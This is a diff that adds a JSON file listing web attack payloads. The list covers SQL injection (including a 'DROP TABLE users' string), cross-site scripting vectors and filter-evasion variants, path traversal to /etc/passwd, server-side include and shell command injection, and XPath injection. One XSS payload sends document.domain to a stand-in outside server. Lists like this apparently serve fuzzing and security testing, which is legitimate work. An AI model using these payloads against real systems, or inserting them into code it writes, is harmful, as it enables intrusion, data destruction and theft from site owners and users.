@@ -1,0 +1,30 @@
+{
+    "payloads": [
+        "' OR '1'='1",
+        "UNION SELECT 1,2,3",
+        "; DROP TABLE users;--",
+        "<script>alert(1);</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "../../../etc/passwd",
+        "<!--#exec cmd=\"ls\" -->",
+        "`; ls",
+        "<script src='data:text/javascript;base64,YWxlcnQoMSk='></script>",
+        "file:///etc/passwd",
+        "; ls",
+        "| ls",
+        "'] | //* | /comment()[contains(.,\"",
+        "'' or 'x'='x",
+        "<iframe src='javascript:alert(1)'></iframe>",
+        "javascript:{ alert`0` }",
+        "<img src=x onError=import('//1152848220/')>",
+        "%2sscript%2ualert()%2s/script%2u",
+        "<svg on onload=(alert)(document.domain)>",
+        "<img ignored=() src=x onerror=prompt(1)>",
+        "<svg onx=() onload=(confirm)(1)>",
+        "<svg on =i onload=alert(domain)",
+        "<svg/onload=location/**/='https://your.server/'+document.domain>",
+        "<svg onx=() onload=window.alert?.()>",
+        "%27%09);%0d%0a%09%09[1].find(alert)//",
+        "&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;"
+    ]
+}
